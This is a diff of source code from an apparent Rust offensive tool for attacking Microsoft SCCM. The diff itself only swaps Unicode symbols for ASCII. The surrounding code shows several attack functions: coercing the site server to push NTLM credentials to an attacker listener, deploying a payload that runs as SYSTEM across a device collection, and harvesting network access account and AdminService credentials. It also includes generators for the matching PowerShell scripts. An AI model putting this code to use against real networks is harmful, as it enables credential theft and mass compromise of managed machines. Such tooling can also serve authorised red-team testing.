@@ -23,9 +23,9 @@ use crate::sccm::{NaaCredential, SccmScanner, SccmScannerConfig, SccmSite};
 use std::time::Duration;
 use tracing::{info, warn};
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Abuse result types
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// Result of a single SCCM abuse technique.
 #[derive(Debug, Clone)]
@@ -63,7 +63,7 @@ impl std::fmt::Display for SccmTechnique {
         match self {
             Self::ClientPushCoercion => write!(f, "SCCM Client Push Coercion"),
             Self::ApplicationDeployment { collection_id } => {
-                write!(f, "Application Deployment → collection {collection_id}")
+                write!(f, "Application Deployment -> collection {collection_id}")
             }
             Self::NaaCredentialExtraction => write!(f, "NAA Credential Extraction"),
             Self::AdminServiceHarvest => write!(f, "AdminService Credential Harvest"),
@@ -71,9 +71,9 @@ impl std::fmt::Display for SccmTechnique {
     }
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Client Push Coercion
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// Trigger the SCCM site server to **push** its NTLM credentials toward
 /// `attacker_listener` by requesting client installation on that host.
@@ -91,7 +91,7 @@ pub async fn client_push_coercion(
     attacker_listener: &str,
 ) -> Result<SccmAbuseResult> {
     info!(
-        "[SCCM/abuse] Client push coercion: site={} → listener={}",
+        "[SCCM/abuse] Client push coercion: site={} -> listener={}",
         site.site_server, attacker_listener
     );
 
@@ -106,7 +106,7 @@ pub async fn client_push_coercion(
     {
         let ps = gen_client_push_ps(site, attacker_listener);
         warn!(
-            "[SCCM/abuse] Non-Windows host — run on a Windows pivot:\n{}",
+            "[SCCM/abuse] Non-Windows host -- run on a Windows pivot:\n{}",
             ps
         );
         Ok(SccmAbuseResult {
@@ -116,7 +116,7 @@ pub async fn client_push_coercion(
             credentials: Vec::new(),
             command_output: Some(ps),
             notes: vec![
-                "Generated PowerShell command for client push — run on a Windows machine."
+                "Generated PowerShell command for client push -- run on a Windows machine."
                     .to_string(),
                 format!("Ensure Responder / ntlmrelayx is listening on {attacker_listener}"),
             ],
@@ -175,7 +175,7 @@ async fn client_push_native(site: &SccmSite, attacker_host: &str) -> Result<Sccm
         credentials: Vec::new(),
         command_output: None,
         notes: vec![
-            "Client push triggered — capture Net-NTLMv2 hash with Responder/ntlmrelayx."
+            "Client push triggered -- capture Net-NTLMv2 hash with Responder/ntlmrelayx."
                 .to_string(),
         ],
     })
@@ -184,7 +184,7 @@ async fn client_push_native(site: &SccmSite, attacker_host: &str) -> Result<Sccm
 /// Generate a PowerShell command to trigger client push from a Windows pivot.
 pub fn gen_client_push_ps(site: &SccmSite, attacker_host: &str) -> String {
     format!(
-        r#"# SCCM Client Push Coercion — run as a user with 'Push Installation' permission
+        r#"# SCCM Client Push Coercion -- run as a user with 'Push Installation' permission
 $SiteServer  = '{srv}'
 $SiteCode    = '{sc}'
 $TargetHost  = '{tgt}'
@@ -206,9 +206,9 @@ Write-Host "[*] Capture the Net-NTLMv2 hash with Responder / ntlmrelayx on $Targ
     )
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Application Deployment Abuse
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// Deploy a payload to all devices in `collection_id` by creating a temporary
 /// SCCM application with a **script** deployment type that runs `command`.
@@ -220,7 +220,7 @@ pub async fn deploy_malicious_application(
     payload_command: &str,
 ) -> Result<SccmAbuseResult> {
     info!(
-        "[SCCM/abuse] Application deployment attack → collection={} command={}",
+        "[SCCM/abuse] Application deployment attack -> collection={} command={}",
         collection_id, payload_command
     );
 
@@ -239,7 +239,7 @@ pub async fn deploy_malicious_application(
         credentials: Vec::new(),
         command_output: Some(ps),
         notes: vec![
-            "PowerShell SDK script generated — import ConfigurationManager module first."
+            "PowerShell SDK script generated -- import ConfigurationManager module first."
                 .to_string(),
             format!("Payload will run as SYSTEM on all devices in collection '{collection_id}'"),
             "Remove the application and deployment after use (cleanup).".to_string(),
@@ -254,7 +254,7 @@ pub fn gen_deploy_application_ps(
     payload_command: &str,
 ) -> String {
     format!(
-        r#"# SCCM Application Deployment Abuse — requires ConfigMgr AdminConsole module
+        r#"# SCCM Application Deployment Abuse -- requires ConfigMgr AdminConsole module
 Import-Module "$env:SMS_ADMIN_UI_PATH\..\ConfigurationManager.psd1" -ErrorAction Stop
 
 $SiteCode = '{sc}'
@@ -291,9 +291,9 @@ Write-Host "[!] CLEANUP: Remove-CMApplication -Name $AppName -Force after execut
     )
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // NAA Credential Extraction (full orchestration)
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// Full NAA credential extraction orchestration.
 /// 1. Discover the site
@@ -319,7 +319,7 @@ pub async fn extract_naa_credentials(config: &SccmScannerConfig) -> Result<SccmA
     if sites.is_empty() {
         return Err(OverthroneError::Protocol {
             protocol: "SCCM".into(),
-            reason: "No SCCM site discovered — is this host a Management Point?".into(),
+            reason: "No SCCM site discovered -- is this host a Management Point?".into(),
         });
     }
     let site = &sites[0];
@@ -328,7 +328,7 @@ pub async fn extract_naa_credentials(config: &SccmScannerConfig) -> Result<SccmA
         site.site_code, site.site_server
     );
 
-    // Step 2: Request machine policy → triggers NAA policy body delivery
+    // Step 2: Request machine policy -> triggers NAA policy body delivery
     let site_code = config
         .site_code
         .clone()
@@ -349,13 +349,13 @@ pub async fn extract_naa_credentials(config: &SccmScannerConfig) -> Result<SccmA
     }
 
     info!(
-        "[SCCM/abuse] Machine Policy received — {} NAA credential(s) extracted",
+        "[SCCM/abuse] Machine Policy received -- {} NAA credential(s) extracted",
         credentials.len()
     );
 
     let notes = if credentials.is_empty() {
         vec![
-            "Machine policy received — no decryptable NAA credentials found.".to_string(),
+            "Machine policy received -- no decryptable NAA credentials found.".to_string(),
             "This may indicate NAA is not configured or credentials are stored differently."
                 .to_string(),
         ]
@@ -376,9 +376,9 @@ pub async fn extract_naa_credentials(config: &SccmScannerConfig) -> Result<SccmA
     })
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // AdminService REST API Credential Harvest (HTTPS, CB 2111+)
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// Use the SCCM AdminService REST API to extract sensitive policy bodies
 /// without requiring WMI or direct database access.
